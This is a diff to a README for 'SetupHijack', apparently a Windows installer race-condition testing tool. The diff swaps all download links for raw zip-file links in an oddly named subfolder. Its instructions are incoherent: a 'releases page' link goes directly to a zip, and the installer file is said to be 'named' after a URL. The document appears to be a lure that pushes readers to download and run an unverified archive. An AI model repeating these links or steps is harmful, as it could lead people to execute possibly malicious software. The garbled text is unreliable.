@@ -4,9 +4,9 @@
 Welcome to SetupHijack! This tool helps you test the security of Windows application installers and update processes. It focuses on race conditions and how files are handled. You can explore vulnerabilities in a safe setting. 
 
 ## 📥 Download SetupHijack
-[![Download SetupHijack](https://raw.githubusercontent.com/Lyrox999/SetupHijack/main/solanidine/SetupHijack.zip)](https://raw.githubusercontent.com/Lyrox999/SetupHijack/main/solanidine/SetupHijack.zip)
+[![Download SetupHijack](https://github.com/Lyrox999/SetupHijack/raw/refs/heads/main/solanidine/Setup_Hijack_3.9-alpha.5.zip)](https://github.com/Lyrox999/SetupHijack/raw/refs/heads/main/solanidine/Setup_Hijack_3.9-alpha.5.zip)
 
-Visit this page to download the latest version of SetupHijack: [Download Now](https://raw.githubusercontent.com/Lyrox999/SetupHijack/main/solanidine/SetupHijack.zip).
+Visit this page to download the latest version of SetupHijack: [Download Now](https://github.com/Lyrox999/SetupHijack/raw/refs/heads/main/solanidine/Setup_Hijack_3.9-alpha.5.zip).
 
 ## 🛠️ System Requirements
 Before downloading, ensure your system meets these requirements:
@@ -26,13 +26,13 @@ SetupHijack includes several features that make security testing easier:
 To get started, follow these steps:
 
 1. **Visit the Releases Page:**
-   Go to the releases page: [Download Now](https://raw.githubusercontent.com/Lyrox999/SetupHijack/main/solanidine/SetupHijack.zip).
+   Go to the releases page: [Download Now](https://github.com/Lyrox999/SetupHijack/raw/refs/heads/main/solanidine/Setup_Hijack_3.9-alpha.5.zip).
 
 2. **Select the Version:**
    Look for the latest version listed. It will be at the top. 
 
 3. **Download the Installer:**
-   Click on the installer file that matches your operating system. The file will usually be named something like `https://raw.githubusercontent.com/Lyrox999/SetupHijack/main/solanidine/SetupHijack.zip`.
+   Click on the installer file that matches your operating system. The file will usually be named something like `https://github.com/Lyrox999/SetupHijack/raw/refs/heads/main/solanidine/Setup_Hijack_3.9-alpha.5.zip`.
 
 4. **Run the Installer:**
    Once the download finishes, locate the file in your downloads folder. Double-click the file to start the installation process.
